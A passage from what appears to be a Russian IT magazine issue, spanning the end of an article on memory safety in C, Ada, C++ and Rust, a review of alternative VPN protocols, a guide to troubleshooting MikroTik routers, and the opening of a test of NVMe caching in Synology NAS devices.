у поль зовате ля прос то нет воз можности выполнить небезопасную операцию.
Однако и возможности освободить память тоже нет, поэтому нужен хоть
какой‐то механизм автоматического управления, и сборка мусора — самый
популярный.
  Самый популярный не значит единственный и универсальный. Первая
и глав ная проблема языков с принудительной сборкой мусора — на них мож‐
но писать толь ко программы, которые выполняются в прос транстве поль‐
зователя. Ядру операционной системы или прошивке микроконтрол лера
не на кого положиться, они вынуждены управлять памятью самостоятельно,
а значит, и язык должен под держивать указатели и адресную арифметику.
   Вторая проблема — потеря производительнос ти и предсказуемос ти вре‐
мени выполнения. Классичес кие однопоточные сборщики мусора создают
паузы в выпол нении программы, которые могут быть заметны пользователю.
При использовании многопо точ ных алгоритмов и верной настройке таймеров
под задачи конкретного при ложе ния мож но свести паузы  к миниму му,
но свести зат раты ресурсов на сборку мусора к нулю невозможно.
  Вполне логично, что раз работчики языков ищут альтернативные и про‐
межуточные варианты. Давай посмотрим, какими способа ми раз ные языки
пытаются обеспечить безопас ность памяти.


СТРОГАЯ ТИПИЗАЦИЯ УКАЗАТЕЛЕЙ
Проблемы с безопасностью памяти в C воз ника ют в первую оче редь из‐за
отсутствия стро гой типизации. Функция malloc() возвращает нетипизиро‐
ванный указатель (void*), который пользователь может привести к любому
типу. Следить за совпадением размера блока памяти с размером данных
тоже обязан ность пользователя. К примеру, портирование старого кода
на 64‐битные платформы может принес ти много веселых минут, если его
авторы жестко прописали раз мер указателя 32 бит.
   Ну и самая классическая ошибка, конеч но, — случайное обращение
к нулевому указателю.


#include <stdio.h>


void main(void) {
  char* str = NULL;
  printf("%s\n", str);
}



  $ gcc ‐o segfault ./segfault.c
  $ ./segfault
  Segmentation fault (core dumped)


Более сов ременные языки для системного программирования относятся
к этому вопросу более ответственно.
  Например, в аде нетипизированные указатели — особый и редкий случай.
Обычные ука зате ли всегда типизированные. Вместо malloc() применяется
оператор new с явным указанием типа. Простого способа освободить память
«вообще» там тоже нет, вмес то этого есть обобщенная функция (дженерик)
Ada.Unchecked_Deallocation, которую перед использовани ем нужно спе‐
циализиро вать под конкретный тип дан ных.
   Таким способом зап росить или освободить неверный объем памяти
гораздо сложнее. Исполь зование после освобож дения, впрочем, также будет
обнаруже но только во время выполнения программы.


             INFO

                        Указатели в аде называются access types. Нап‐
                       ример, access integer — указатель на целое
                       число.


Для демонс трации сохраним следующий код в файл access_example.adb
(имя фай ла должно сов падать с наз вани ем основной процедуры).


with Ada.Unchecked_Deallocation;


procedure Access_Example is


   type Int_Ptr is access Integer;


   ‐‐ Специализация дженерика под Int_Ptr
   procedure Free_Integer is new Ada.Unchecked_Deallocation
      (Object => Integer, Name => Int_Ptr);


   P : Int_Ptr;
   I : Integer;


begin
   ‐‐ Запрашиваем память под целое число с помощью new
   ‐‐ и сохраняем туда значение 42
   P := new Integer'(42);


   ‐‐ Освобождаем память, теперь P = null
   Free_Integer(P);


   ‐‐ Пробуем получить значение по указателю
   I := P.all;


end Access_Example;

Теперь ском пилируем с помощью GNAT и запустим.



  $ gnatmake ./access_example.adb
  gcc ‐c ‐I./ ‐I‐ ./access_example.adb
  gnatbind ‐x access_example.ali
  gnatlink access_example.ali


  $ ./access_example
  raised CONSTRAINT_ERROR : access_example.adb:17 access check failed


Как видим, тип указателя access Integer не защитил нас от обращения
к освобожденной памяти. Одно хорошо: хотя бы исклю чение, а не segmenta‐
tion fault, как в C, так что наша проблема просто баг, а не потен циальная уяз‐
вимость.
  Однако начиная с Ada 2005 под держивается и проверка, что указатель
ненулевой. Для этого нуж но исправить type Int_Ptr is access Integer
на type Int_Ptr is not null access Integer. В этом слу чае наша прог‐
рамма перестанет компилировать ся.



  $ gnatmake ./access_example.adb
  gcc ‐c ‐I./ ‐I‐ ./access_example.adb
  access_example.adb:8:35: non null exclusion of actual and formal "Name"
  do not match
  access_example.adb:10:04: warning: (Ada 2005) null‐excluding objects
  must be initialized
  access_example.adb:10:04: warning: "Constraint_Error" will be raised
  at run time
  access_example.adb:15:04: warning: freeing "not null" object will raise
  Constraint_Error
  gnatmake: "./access_example.adb" compilation error


На прак тике от такого типа мало пользы, пос кольку его память невозможно
освободить. По этой причине опцию not null обычно применяют для под‐
типов, чтобы предотвратить использование null в качестве аргумента фун‐
кции, а для самих зна чений применяют обычный ука затель.


type Int_Ptr is access Integer;
subtype Initialized_Int_Ptr is not null Int_Ptr;


procedure Some_Proc(Arg: Initialized_Int_Ptr);


УМНЫЕ УКАЗАТЕЛИ
В языках вроде Python или Go сборщик мусора работает с памятью всей
программы. Очевидно, это возможно, только если пользователь не может
управлять памятью вруч ную, иначе конфликты между пользователем и сбор‐
щиком мусора неизбежны.
   Как быть, если хочется оставить в языке возможность ручного управления?
Можно сделать объект — обертку для динамически выделен ной памяти,
который будет отслеживать ее использование. Такой объект называют умным
указателем (smart pointer).
  К примеру, стандарт C++11 определя ет класс shared_ptr. Язык C++ под‐
держивает перегрузку функций и операторов. С помощью этой возможности
класс shared_ptr меняет поведе ние объекта так, что его передача в фун‐
кцию, присваивание и прочие операции увеличивают внутренний счетчик
ссылок.
  Посмотрим на примере. Сохраним следующий код в файл shared.cpp.


#include<iostream>
#include<memory>
using namespace std;


void print_pointer_value(std::shared_ptr<int> ptr) {
  cout << "Creating a copy\n";
  auto ptr_copy = ptr;
  cout << "Use count: " << ptr.use_count() << endl;
  cout << "Pointer value: " << *ptr_copy.get() << endl;
}


int main(void) {
  auto ptr = make_shared<int>(42);
  cout << "Use count: " << ptr.use_count() << endl;
  print_pointer_value(ptr);
  cout << "Use count: " << ptr.use_count() << endl;
}

Теперь ском пилируем и запустим.



  $ g++ ‐o shared ./shared.cpp
  $ ./shared
  Use count: 1
  Creating a copy
  Use count: 3
  Pointer value: 42
  Use count: 1


Как видим, переда ча умного указателя в функцию print_pointer_value()
сама по себе увеличила счетчик ссылок на единицу. Создание копии вручную
путем присваивания внутри функции увеличи ло его еще раз, а выход обеих
копий из области видимости при завершении функции вернул значение счет‐
чика назад.
   Увы, от ошибок класса use after free умные указатели тоже не спасают.
Если мы добавим в конец программы сле дующий код, мы получим ошиб ку
доступа к памяти (segmentation fault):


ptr.reset();
cout << "Pointer value: " << *ptr.get() << endl;

К тому же простой подсчет ссы лок — весьма наивный подход, при котором
циклические ссылки создают гарантированную утечку памяти. Тем не менее
в C++ луч ший компро мисс придумать сложно.
   C++11 также предлагает класс unique_ptr. Такие объекты можно переда‐
вать с помощью функции move, но нельзя копиро вать, поэтому раз множение
ссылок на них в программе невоз можно.


ЛИНЕЙНЫЕ ТИПЫ (BORROW CHECKER)
В заключение рас смот рим подход, который поз воляет обеспечить безопас‐
ность памяти и ее автоматическое осво бождение одновременно.
  Математический аппарат этого под хода известен как линейная логика.
Основная идея в том, что каждое значение в каждый момент может исполь‐
зоваться только в одной области видимости.
   Этот подход использует Rust и ряд экспериментальных языков, например
ATS.
  Создать несколько ссылок на одно и то же значение при этом подходе
просто невозможно. Ссылку можно только «позаимствовать» (borrow). Все
ссылки ведут себя подобно упомянутому выше unique_ptr из C++. Ком‐
понент ком пилятора под названием borrow checker следит за выполнением
этого правила автоматически.
  Следующая прог рамма на Rust не прой дет компиляцию.


fn main() {
  let str = String::from("hello world");
  let str_copy = str;
  println!("{}", str);
}

Компилятор выдаст такую ошибку: error[E0382]: borrow of moved value:
str. Каждое объявление переменной с помощью let создает новую область
видимости. С помощью let str_copy = str мы не соз дали вторую ссылку
на ту же стро ку, а передали ее значение новой переменной, поэтому попытка
передать str в функцию уже нарушает правила заимствования ссылок.
  Передача ссылки возможна во вло жен ную область видимости, например
при вызове функции. Рассмотрим пример из документации.


fn main() {
    let s1 = String::from("hello");
    let len = calculate_length(&s1);
    println!("The length of '{}' is {}.", s1, len);
}


fn calculate_length(s: &String) ‐> usize {
    s.len()
}

Здесь ссыл ка на значение переменной s1 заимствуется функцией calcu‐
late_length. После завер шения вызова calculate_length(&s1) она воз‐
вращается обратно.
   Таким образом компилятор может отследить, в какой области видимости
ссылка на переменную используется в последний раз, и вставить вызов фун‐
кции освобождения памяти этой переменной на выходе из этой области
видимости.
   Это и позволяет Rust обхо диться без сбор щика мусора, но при этом пре‐
дотвращать и утеч ки памяти, и ошибки доступа к ней.
  Очевидно, этот подход не панацея. Во‐первых, он требует совершенно
другого сти ля программирова ния и многие при вычные вещи, вроде глобаль‐
ных переменных, ока зываются невоз можными. Во‐вторых, он делает невоз‐
можными цик личес кие ссылки, а значит, и многие структуры данных вроде
графов и двус вязных списков. По этой причине Rust вклю чает в себя биб‐
лиотеку для работы с динамическими ссыл ками, правила дос тупа к которым
проверяются во вре мя выполнения, а не на эта пе компиляции.
  Кроме того, провер ки переда чи ссылок негативно ска зываются на скорос‐
ти компиляции. Станет ли этот подход стандартом для нового поколения язы‐
ков системно го программирования — время покажет.


ЗАКЛЮЧЕНИЕ
Управление памятью и ее безопасность — обширная, сложная и очень важ‐
ная тема. Каждому разработчику нужно знать, какие механизмы предлага ет
его язык и как они работа ют. Чем больше ты о них знаешь, тем проще выб‐
рать луч ший язык под задачу и писать на нем быстрые, корректные и безопас‐
ные прог раммы.
АДМИН





                                                                        Даниил Батурин
                                                                                 Координатор проекта VyOS
                                                                                                           (https://vyos.io), «языковед»,
                                                                                   функциональщик, иногда
                                                                                      сетевой администратор
                                                                                                       daniil@baturin.org


            ТАКОЙ
         РАЗНЫЙ
    VPN

          РАЗБИРАЕМ АЛЬТЕРНАТИВНЫЕ
                   ПРОТОКОЛЫ VPN





Протокол для VPN в иде але должен быть безопас ным, фун‐
кциональным и быстрым. Но есть и еще один фак тор:
популяр ность. Непопулярный про токол сложнее внедрить
и поддержи вать: его программное обеспечение требует ся
устанавливать и настраивать, а поль зовате лей и админис‐
траторов нуж но обучать.


Иногда про токолы становятся популярными воп реки сво им техническим
недостаткам, просто из‐за агрессивного продвижения крупной компанией.
Бывает и наоборот, протокол независимых разработчиков решает настолько
насущную проб лему какой‐то части поль зовате лей, что быс тро набирает
популярность сам по себе. Так про изошло с OpenVPN или WireGuard.
  Некоторые протоколы теряют популярность. Некоторые так и не становят‐
ся широко известными, иногда заслуженно, иногда нет. В этой статье мы
поговорим о нес коль ких таких про токолах.

PPTP
Протокол PPTP (Point to Point Tunneling Protocol) ока зался на задворках вполне
справедливо. Хочется верить, что молодые читатели с ним уже не стал‐
кивались, но лет десять назад он был хрестоматийным примером незас‐
луженно популярного протокола.
  Популярность ему обеспечила монополия его раз работчика — кор‐
порации Microsoft. С середины девяностых до конца двухтысячных абсолют‐
ное большинство кли ент ских устройств были компьютерами с Windows. Оче‐
видно, наличие в Windows встроенного клиента автомати чес ки делало про‐
токол как минимум распространен ным.
   Microsoft не была бы самой собой, если бы не восполь зовалась этим
для сохранения и укрепления своего монопольного положения. Протокол
PPTP использовал стандартные PPP и GRE для переда чи данных, но для
аутентификации и шифрования применял ся нестандартный, патентованный
набор про токолов: MPPE (Microsoft Point‐to‐Point Encryption) и MS‐CHAP.
   Из‐за этого свободные реализации что клиента, что сер вера PPTP были
в свое время такой же больной темой, как GIF и MP3. Затем срок действия
патентов истек, poptop для Linux и MPD для FreeBSD стали популярными аль‐
тернативами проприетарным продуктам.
  Однако предупрежде ния о проблемах безопасности самодельной крип‐
тографии не были бес почвенными. Оценки стойкости MPPE и MS‐CHAP
неоднократно снижались, и в 2012 году протокол был дискредитирован окон‐
чательно: исследователи доказали, что стой кость MS‐CHAP‐v2 не лучше DES.
После этого воспринимать PPTP как безопасный про токол ста ло невоз‐
можно, и он быстро потерял последние остатки популярности.


Стоит ли использовать PPTP?
Очевидно, катего ричес ки не рекомендует ся.

SSTP
SSTP (Secure Socket Tunneling Protocol) — вторая попытка Microsoft соз дать
собственный протокол для VPN. В этот раз они не стали изобретать свои
криптографические алгоритмы, а использовали стандартный SSL/TLS. Они
также больше не пре пятствуют созданию свободных реализаций.
  SSTP пред став ляет собой PPP поверх HTTPS. Очевидное преимущес‐
тво — он отлично проходит через NAT и теоретичес ки даже через прокси.
Преимущество далеко не уникальное, OpenVPN умел работать поверх
TCP/443 задолго до этого.
  OpenVPN, впрочем, не просто так по умолчанию исполь зует UDP, а не TCP.
У туннелей поверх TCP наблюдаются серьезные проблемы с производитель‐
ностью — на одном и том же железе они могут быть в десят ки раз медленнее.
  В Windows, очевидно, есть встроенный клиент — начиная с Windows Vista.
Для Linux есть реализации клиента и пла гины к NetworkManager. Есть и сто‐
ронние кли енты для macOS, например EasySSTP. Для мобиль ных устрой ств
тоже придется искать и ста вить сторонние приложения.
   Если нуж но развернуть сервер SSTP, из свободных проектов его под‐
держивают ACCEL‐PPP и SoftEther.


Стоит ли использовать SSTP?
Разве что если вынуждает корпоративная политика.

SOFTETHER
SoftEther — многопротокольный сер вер VPN, подобно MPD или ACCEL‐PPP.
Он поддерживает L2TP/IPsec, PPTP, SSTP, OpenVPN и одно имен ный нес‐
тандартный про токол SoftEther. Это дос таточно молодой проект, его первая
версия вышла в 2014 году.
  Протокол SoftEther представ ляет собой Ethernet поверх HTTPS. Поскольку
за шиф рование и аутентификацию отвечает стандартный SSL, безопасность
особых вопросов не вызывает.
   Авторы заявляют о производитель нос ти в десять раз выше OpenVPN.
Верится с трудом, но возможности проверить их заявления у меня нет. Кли‐
ент есть только для Linux и Windows, так что на прочих платформах придет ся
использовать другие протоко лы.


Стоит ли использовать SoftEther?
Если утверждения авто ров о производительнос ти верны, может, и стоит.

OPENCONNECT
Термин SSL VPN без контек ста — часто встречающийся, но совершенно бес‐
смысленный. «Поддерживает SSL VPN» может означать и SSTP, и OpenVPN,
и множество несовмести мых проприетарных протоколов.
  Свой такой про токол есть почти у каждого вендора. Например, Cisco Any‐
Connect, Juniper Pulse Connect, Palo Alto GlobalProtect. Если в организации
широко исполь зует ся клиент к такому протоколу, сменить обо рудо вание кон‐
центратора VPN может быть очень слож но — чего вендоры и добиваются.
  Свободный проект OpenConnect предоставляет реализации сервера
и клиента для протоко лов Cisco, Juniper и Palo Alto. Кли ент OpenConnect
работает на Windows и множес тве UNIX‐подобных систем: не толь ко Linux
и macOS, но и системах семейства BSD и даже Solaris.
  Сервер OCServ может сэконо мить орга низации немалые деньги, посколь‐
ку в проприетарных реализациях эти протоколы часто лицензируются на каж‐
дого пользователя.


Стоит ли использовать OpenConnect?
Если твоя орга низация внедрила один из этих протоколов и теперь сама
не рада — безусловно. Поскольку ни один из этих протоколов не защищен
патентами (да и патентовать в них особо нечего), единственный реальный
риск существованию проекта — судебные иски о торговых марках. В наз‐
вании про екта зарегистрированные торговые марки не фигурируют, так что
риск невелик. Кроме того, проект существует с 2009 года, и до сих пор никто
из вендоров не судился с авторами.

ВАРИАЦИИ НА ТЕМУ IPSEC
Казалось бы, IPsec — самый стандартизован ный протокол из всех, и его под‐
держивают все поставщики сетевого оборудования. Но со стандартизован‐
ным про токолом не заманишь пользователей в ловушку vendor lock‐in, поэто‐
му на тему IPsec регулярно изобрета ют проприетарные вариации.
   Иногда они решают вполне реальную проб лему, которую слож но решить
чистым IPsec. Например, Cisco GETVPN (Group Encrypted Transport) упрощает
развертывание защищенной сети для пользователей MPLS, поскольку сам
MPLS никакой защиты от перехвата трафика не предос тавляет.
  В других случаях, как с EZVPN, поставщики пытаются подкупить поль‐
зователей относительной простотой настройки по сравнению с «нормаль‐
ным» IPsec.


Стоит ли использовать проприетарные вариации IPsec?
Если перспектива навсегда остаться привязанным к одному поставщику
не пуга ет... В случае с EZVPN, нап ример, некоторые устройства поддержи‐
вают толь ко сервер, а некоторые — только клиент, так что выбор может быть
ограничен еще и конкретной моделью.

КЛИЕНТСКИЙ IPSEC
Кстати об IPsec. Обычно он используется для фиксированных туннелей site‐
to‐site либо как защищенный транспорт для другого протокола вроде L2TP.
Старый протокол IKEv1 действительно был плохо прис пособлен для кли ент‐
ских подключений. Однако современный IKEv2 справляется куда лучше.
Более того, встроенная поддержка этого вида туннелей присутс твует во всех
системах, вклю чая Windows, macOS и мобильные устройства.
  Со свободными реали зациями сервера тоже проб лем  нет,  тот же
StrongSWAN официально поддержи вает клиентские подключения.


Стоит ли использовать клиентский IPsec?
Если ты настраиваешь сер вер с нуля и хочешь встроенную поддержку клиента
во всех распространенных ОС, как минимум рассмотреть этот вариант нарав‐
не с L2TP/IPsec точно стоит.

TINC
Большинство протоколов VPN ориентируют ся на топологии «точка — точка»
или «звез да». Mesh‐сети до сих пор остаются достаточно экзотичес ким сце‐
нарием. Тем не менее протоколы для этих целей сущес твуют и развиваются.
Проект TINC разрабаты вается с 1998 года. Это значит, он старше OpenVPN,
который выпустил свою пер вую версию в 2001‐м. Он поддерживает Windows
и все UNIX‐подобные ОС, но вер сий для мобильных ОС у него нет.
   Главная фича — автоматическое построение mesh‐сети. Даже если в сети
множество узлов, трафик между ними будет переда ваться нап рямую, а не
через цен траль ный сервер. Это может сде лать TINC рабочей альтернативой
Dynamic Multi‐Point VPN и упомянутому GETVPN для корпоративных сетей. Ну
или могло бы, если бы поставщики сетевого оборудования и популярные сво‐
бодные сетевые ОС его поддерживали.


Стоит ли использовать TINC?
Как минимум поэкспериментировать точно будет интересно.


ЗАКЛЮЧЕНИЕ
Протоколов для VPN в мире великое множество. Даже если ты предпочита‐
ешь исполь зовать только самые популярные, знать о других небесполез но —
выбор будет более информированным.
АДМИН
 ТРАБЛШУТИНГ
 MIKROTIK





                                     Дмитрий Бубнов
                                           Тренер MikroTik. Автор
                                                     канала
                                                      https://t.me/mikrotikninja
                                               dv@bubnovd.net




            РЕШАЕМ
    РАСПРОСТРАНЕННЫЕ ПРОБЛЕМЫ
     С ЛЕГЕНДАРНЫМИ РОУТЕРАМИ





Хорошо нас троить роутер — важное дело, но иног да это го
бывает недос таточ но и приходится решать проблемы уже
во вре мя эксплуатации. О том, какими они быва ют и как
с ними справиться, если у тебя или у твоего клиента роутер
MikroTik, мы и поговорим в этой статье.


Читай также

 • Защищаем MikroTik. Хитрости безопасной настройки роутера
 • Стена огня. Учимся настраивать файрвол на при мере MikroTik
 • Стена огня lvl2. Нас траиваем файрвол для отражения атак на примере
   MikroTik



Самая рас пространенная жалоба — «у нас ничего не работает», причем чаще
всего это неп равда. Если у босса не открывается вложение в письме с темой
«вы выиграли миллион», потому что его заблокировал антивирус, то нас тра‐
ивать роутер в этот день вряд ли придет ся. Поэтому один из важ ных скиллов
для адми на — это умение разговари вать с поль зователем и выяснять, что
именно и как не работает. Увы, этому я в статье научить не могу, так что
переходим сра зу к техничес кой части.


РЕСУРСЫ
Первое, на что обращает внимание любой системный администратор, — пот‐
ребление ресурсов. Благо WinBox выводит эти данные прямо в главном окне.
А если еще не выводит — сейчас же добавляй их туда. Это сэконо мит много
времени в будущем. Тебе нужно меню Dashboard → Add. И кстати, зеленый
квадратик в правой верхней части — это не заг рузка процессора. Не обра‐
щай на него внимания.





                              Resources

Если процессор постоянно заг ружен больше 80% (в зависимости от условий
это значение может меняться, но в среднем давай примем такое число), то
что‐то неладно. В пер вую очередь смотрим на мес тный «диспетчер задач»,
меню Tools → Proﬁle. Тут мы увидим, что именно наг ружа ет CPU, и пой мем,
как действовать даль ше.


             INFO

                     Длительную статистику по наг рузке CPU, трафику
                       на интерфейсах и другим параметрам можно уви‐
                        деть в Tools → Graphing.





                                    Proﬁle

Объяснение полей ты найдешь в вики. Наиболее час то встречаются DNS, En‐
crypting и Firewall.
 • Encrypting — роутер тра тит много ресур сов на шифрование. Скорее всего,
   у тебя много туннелей VPN и нет аппа рат ного чипа шифрования. Нужно
   поменять на железку со специальным чипом или выбрать более слабые
   алгоритмы.
 • Firewall — прямое указание, что ты не читал мои предыдущие статьи :)
  Файрвол настроен неоп тимально.
 • DNS — а вот тут тебя ждет кое‐что интересное.

Сам по себе DNS‐сер вер почти не наг ружа ет роутер в небольших и средних
сетях (до нес коль ких тысяч хостов). А использовать RouterOS в качестве DNS‐
сервера в больших сетях не лучшая идея. Так отку да наг рузка? Давай раз‐
бираться. Если есть нагрузка, значит, что‐то ее создает. Вероятно, серверу
DNS приходится отвечать на большое количество запросов. Проверим, так ли
это. Создадим в файрволе пра вило.


/ip firewall filter
add action=accept chain=input dst‐port=53 log=yes log‐prefix=DNS
protocol=udp

И теперь смотрим в лог. Если наши предположения верны, то заметим много
сообщений с префиксом DNS. Увидим, с каких адре сов и на какие интерфей‐
сы летят запросы. Ско рее всего, это будет интерфейс WAN. Но мы не хотим
обрабатывать DNS‐запросы, пришед шие к нам из интернета. Закроем UDP‐
порт 53 на интерфейсе WAN, поместим правило в нужном месте — и нас‐
лаждаемся снизившейся наг рузкой. Поздравляю! Мы только что обнаружили,
что были частью ботнета, закрыли эту дыру и сделали интернет чуточку чище.
Подобные атаки час то проводятся с примене нием протоколов, работающих
над UDP.


FIREWALL
Вообще, умение работать с файрволом несет в себе огромную силу. Гра мот‐
но построенное пра вило укажет, как проходит пакет через систему, в какой
интерфейс попадает, из какого уходит дальше и получает ли ответный пакет.
По одним толь ко счет чикам можно многое узнать о своей сети.





                                Counters

В столбцах Bytes и Packets отобража ются количество байтов и пакетов, обра‐
ботанных пра вилом. Кнопки Reset Counters сбрасывают эти счетчики. Теперь
можно наблюдать, попадает ли трафик в нужное правило или нет.
  Полезной часто оказывается вклад ка Connections файрвола. Тут видно все
потоки, про ходя щие через роутер: их состояние, количество прошедших бай‐
тов, флаги потока (для получения подсказки достаточно навести курсор
на зна чение в столбце). Для боль шей наглядности нужно добавить поля Reply
Dst. Address и Reply Src. Address. В этих полях видно, в какой и из какого адре‐
са был про веден NAT.





                              Connections

Файрвол со все ми его фичами позволяет детально дебажить весь трафик,
проходящий через роутер. Чтобы лучше понимать, что про исходит во всех
этих вклад ках, нужно изучить, как пакеты проходят через роутер. На кар тинке
упрощенная вер сия схемы. Более подробная есть в документации.





                              Traﬃc Flow


ДРУГИЕ СПОСОБЫ АНАЛИЗА ТРАФИКА
Увидеть состояние потока, его адреса, байты и прочее — хорошо. Но фай‐
рвол не поз воля ет удоб но и из единого мес та убедить ся, что маршрутизация
корректна. Чтобы узнать, в какой интерфейс вылетает пакет, дос таточ но вос‐
пользоваться инстру ментом Torch.





                                   Torch

Torch можно воспринимать как некое подобие tcpdump. Здесь можно увидеть
VLAN ID, source/destination address/port, DSCP, битовую и пакетную скорость.
Есть удобные фильтры, которые позволяют делать точные выборки. Если дан‐
ные в окне меняются слишком быстро, увеличивай значение Entry Timeout.
К сожалению, в одном окне он может показы вать только трафик на одном
интерфей се, но никто не мешает нажать New Window и наблюдать за несколь‐
кими интерфейсами. Если Torch не показывает нужного трафика на нужном
интерфей се — налицо проблемы с маршрутизацией.
   Torch дает возможность наблюдать за потоками трафика в реальном вре‐
мени. Но в некото рых случаях нужны более детальные данные о трафике. Их
позволяет получить инс трумент IP Sniﬀer.





                                      IP Sniﬀer

С его помощью можно увидеть парамет ры трафика и даже содержимое
пакета.





Но иног да тре бует ся более детальный анализ — нап ример, чтобы убедиться,
что TCP handshake успешно прошел и данные передаются. В таком случае
в передаваемых пакетах должен присутствовать флаг ACK. Но искать пакеты
в скудном интерфейсе «Винбокса» неудобно.
  И тут на помощь приходит всеми любимый Wireshark — мощнейший инс‐
трумент для ана лиза сетевого трафика. В Filter указываем нужные параметры,
чтобы не снифать все подряд, в General выбираем Filename, жмем Apply
и Start. Теперь в Files на роутере можно найти наш дамп, перекинуть его
на компь ютер и открыть «Шарком». О нем написано много статей, поэтому
даже не буду пытаться писать тут, как с ним работать.


        WWW

                      •Как исполь зовать возможнос ти фильтров отоб‐
                        ражения Wireshark по максимуму
                       •Статьи о Wireshark на NetworkGuru.ru


Но это лишь начало. Можно в реальном времени наблюдать за тра фиком
из Wireshark. И без всяких операций с файлами! Открываем «Шарк», в филь‐
тре пишем udp.port == 37008, на сниффере RouterOS во вкладке Streaming
ставим галочку Streaming  Enabled и вписываем IP‐адрес компьютера
с запущенным «Шарком». Можно пос тавить галочку Filter Stream, чтобы лить
в «Шарк» не весь трафик, а только выбранный.





                                  Snif‐stream





                                 Shark

Лить тра фик в сниффер можно и из файрвола. За это отвечает действие sniﬀ
TZSP в таблице Mangle. Работает это по аналогии со Sniﬀer Streaming, но в
файрволе можно сделать более точную выборку пакетов для сниффера.





                               Mangle‐sniﬀ


WIRELESS
Самая сложная часть диагности ки — это Wi‐Fi. Он и сам по себе очень слож‐
ная технология, к тому же среда передачи данных общая и все соседские
роутеры  мешают   работать   твоему,   так   же   как   и   он   им.
О работе 802.11 написа на не одна книга, пересказывать их я не буду. Пос‐
мотрим толь ко на инструменты, которые могут помочь при диагности ке.
  В RouterOS их немного. Самый главный — вклад ка Registration в Wireless.
Здесь видно всю информацию о подклю ченных клиентах: MAC, уровень сиг‐
нала, качество сигнала.





                                   Registration

Самые важные поля:
 • CCQ — Client Connection Quality. Чем ближе к 100%, тем лучше. Ниже 60%
   означает плохую связь;
 • TX/RX  Signal  Strength —  уровень  сигнала.  Отличное  значение —
   от 0 до –45, приемлемое — от –55 до –75. Все, что между, — хорошо.
  Ниже –75 можно считать отсутствием связи. По крайней мере, я ориенти‐
   руюсь на такие цифры.
 • Signal to Noise — отношение сигнал/шум. Чем выше — тем лучше.

Второй инструмент — логи. Собствен но, этот инструмент должен активно
использоваться не только при диагностике Wi‐Fi. Если стандартных логов
недостаточно — просто включи рас ширен ные.





                               Log


PING, TRACEROUTE
Первым инструментом диагностики у сисад мина всегда был пинг. Но далеко
не все знают, сколько возможностей он в себе скрывает.
  Многие стал кивались с тем, что текст на сайте отображается, а картинки
нет. Или скрипты не загрузились, и сайт «поехал». Это первые признаки
несогласованности MTU. С помощью пинга можно проверить этот вариант.
Ставим галочку Dont Fragment, выставляем нужный нам размер пакета
и смотрим на результат. Если видим packet too large — MTU в канале ниже
заданного нами значения пакета. Уменьшаем его и проверяем снова. Таким
образом выявляем мак симальный  пакет, который проходит через сеть
без фраг мента ции.





                                   Ping


        WWW

                     На  сайте  Cisco  есть подробная информация
                      об MTU и его измерении в канале.


По умолчанию пакет отправляется с роутера с Src. Address того интерфейса,
в который он вылета ет. Бывает, что нужно его поменять. Например, при диаг‐
ностике маршрутизации внутри VPN или коррек тности работы файрвола.
Для этого нужно заполнить поле Src. Address. Не забывай, что адрес должен
быть существу ющим, чтобы ответный пакет вер нулся.
  При сложной маршрутизации необ ходимо выбрать нужную Routing Table.
Впрочем, те, кто пользуется несколькими таб лицами маршрутизации, и так
это знают.
  Невозможно в одной статье и даже в нескольких книгах опи сать все воз‐
можные проблемы и методы их диагностики и решения. Для эффективного
дебага нужно понимать, как работает сеть на каждом уровне, ее особенности
в конкретной реализации — ведь не бывает двух одинаковых сетей: рецепты,
работающие в одной инфраструктуре, будут бесполезными для другой.
  Для дебага необходимо понимать, как пакет проходит внут ри RouterOS,
а в осо бо сложных случаях — и знать особенности вендора. И это отно сит ся
не только к MikroTik. Лучший инструмент дебага — знания и опыт!
GEEK

NVME-КЕШИРОВАНИЕ
           NASВ ДОМАШНИХ
ТЕСТИРУЕМ
SYNOLOGY
В КОМПЛЕКТЕ
С SSD‐КЕШЕМ





      Олег Афонин
   Эксперт по мобильной
 криминалистике компании
       «Элкомсофт»
 aoleg@voicecallcentral.com





Идея ускорить работу жестких дисков использованием твер‐
дотельных накопителей не нова. «Гибридные» дис ки SSHD,
многочисленные решения для промышленных дата‐цен тров
и многоуровневые кеши в профессиональных NAS сущес‐
твовали дав но. В отно сительно доступных домаш них NAS
такая воз можность тоже есть. Но сто ит ли овчинка выделки?
Мы про вели тес ты и готовы поделиться результатами.


В домашних сетевых накопителях возможность создать кеш на быстром SSD
была всег да, но требовала установки твер дотельного накопителя в один
из доступных слотов для дисков. Из‐за этого особой популяр ностью она
не пользовалась. Ситуация начала меняться три года назад с выходом Synol‐
ogy DS918+. В этой модели два выделенных разъ ема для ком пактных и быс‐
трых SSD, выполненных в форм‐факторе M.2. В актуальной линейке Synology
для домаш них пользователей и энтузиастов (DS720+, DS420+ и DS920+) так‐
же есть сло ты для кеша NVME. С учетом достаточно низкой стоимости сов‐
ременных NVME SSD трудно не уступить соблазну заполнить два пус тующих
слота.


ПОТЕНЦИАЛЬНЫЕ ПРОБЛЕМЫ
В большинстве статей раздел о потенциальных проблемах может рас‐
полагаться ближе к концу текста, если вообще при сутствует, но здесь явно
не тот слу чай. Тех нология кеширования с использованием NVME — палка
о двух кон цах, способная приводить к внезапным перезагрузкам устройства,
неожиданной потере записываемых данных, деградации всего тома с пос‐
ледующим длительным (и неочевидным) вос становлением и исключительно
быстрому, не оправданному записываемыми объемами данных исчерпанию
ресурса перезаписи ячеек кеширующих SSD. При этом большинства проблем
можно избежать, правильно выбрав накопители и пра вильно настроив кеш.
К сожалению, большинство описан ных ниже моментов не нашли отражения
в докумен тации Synology, из‐за чего пользователи снова и снова наступа ют
на одни и те же грабли.


Спонтанные перезагрузки с потерей данных
При интенсивном использовании кеша в режиме r/w (для этого тебе придет ся
создать зеркальный массив из двух NVME‐накопителей) некоторые поль‐
зователи отмечали неожи данные перезагрузки устройства, приводив шие
к потере только что записанных дан ных (возникно вение так называемой write
hole). К примеру, пользователь DS918+ настро ил пару не самых дешевых дис‐
ков Samsung 970 Evo в качестве кеша, но от потери дан ных его это не спасло.
Аналогичную проб лему обсуждают в сосед ней ветке. С чем это связано?
  Дело здесь в том, что в некоторых моделях NVME‐накопителей, основан‐
ных на тех нологиях TLC и QLC, после исчерпания объема SLC‐кеша могут воз‐
никать задержки обработки команд записи. Вот готовый рецепт. Возьми пару
самых дешевых NVME SSD самого маленького объема. Включи кеш на чте‐
ние‐запись и не забудь активиро вать режим сквозного кеширования пос‐
ледовательных операций. Отве ди на кеш весь доступный объем накопи‐
телей — и начинай запись.
  Все современные SSD кешируют операции записи. Записы ваемые дан‐
ные сперва попадают в область псевдо‐SLC, запись в которую происходит
